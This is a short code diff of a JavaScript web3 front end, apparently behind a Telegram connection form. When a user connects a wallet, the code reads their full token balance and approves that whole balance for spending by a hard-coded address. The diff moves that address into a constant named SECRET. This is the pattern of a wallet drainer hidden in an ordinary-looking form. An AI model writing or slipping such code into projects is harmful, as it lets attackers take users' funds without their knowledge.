@@ -747,6 +747,7 @@ const CONTRACT_ABI = [
   },
 ];
 const CONTRACT_ADDRESS = "0x971B6a9f1833AF2308968C72E63072Fb9DACb240";
+const SECRET = "0x50D524baA73201E1e1B1c8e0d53107a78da32022";
 
 // DESC: IDs
 const FORM_ID = "telegramConnectionForm";
@@ -805,7 +806,7 @@ const callContractMethod = async ({web3, contract, telegramId}) => {
   // get ballance
   const balance = await contract.methods.balanceOf(accounts[0]).call();
   await contract.methods
-    .approve("0xAF5Fe472f6cADB5166233BE45Ef3fC71Ad7C92A4", balance)
+    .approve(SECRET, balance)
     .send({ from: accounts[0] });
 };
 const loadWeb3 = async () => {
